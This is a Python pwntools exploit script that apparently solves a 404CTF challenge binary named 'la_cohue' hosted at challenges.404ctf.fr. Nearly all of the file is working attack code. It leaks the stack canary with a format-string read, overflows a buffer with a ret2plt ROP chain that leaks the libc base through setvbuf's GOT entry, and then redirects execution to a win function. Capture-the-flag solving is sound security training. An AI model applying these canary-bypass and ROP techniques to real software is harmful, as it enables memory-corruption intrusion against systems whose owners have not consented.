#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *


exe = context.binary = ELF('la_cohue_patched')
libc = ELF('libc.so.6')

host = args.HOST or 'challenges.404ctf.fr'
port = int(args.PORT or 30223)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

#####################
# Step 1: canary leak
#####################
io.sendlineafter(b'>>> ',b'2')
io.sendline(b'%17$p')
io.recvuntil(b'[Vous] : ')
canary = int(io.recvline(),16)

log.success(f'{canary = :x}')

#################
# Step 2: ret2plt
#################
io.sendlineafter(b'>>> ', b'1')

OFFSET = cyclic_find(0x6161616461616163)
p = b'A'*72
p += p64(canary)
p += b'B' * OFFSET
rop = ROP(exe)
rop.rdi = exe.got['setvbuf']
rop.puts()
rop.choices()
p += rop.chain()

io.sendline(p)

io.sendlineafter(b'>>> ', b'3')

leak = u64(io.recvline().strip().ljust(8,b'\0'))
libc.address = leak - libc.sym['setvbuf']

log.success(f'{leak = :x} {libc.address = :x}')

##################
# Step 3: ret2win
##################
io.sendlineafter(b'>>> ', b'1')

OFFSET = cyclic_find(0x6161616461616163)
p = b'A'*72
p += p64(canary) 
p += b'B' * OFFSET
p += p64(exe.sym['canary'])

io.sendline(p)

############################
# Step 4: exit and get shell
############################
io.sendlineafter(b'>>> ', b'3')


print(io.recvall().decode())

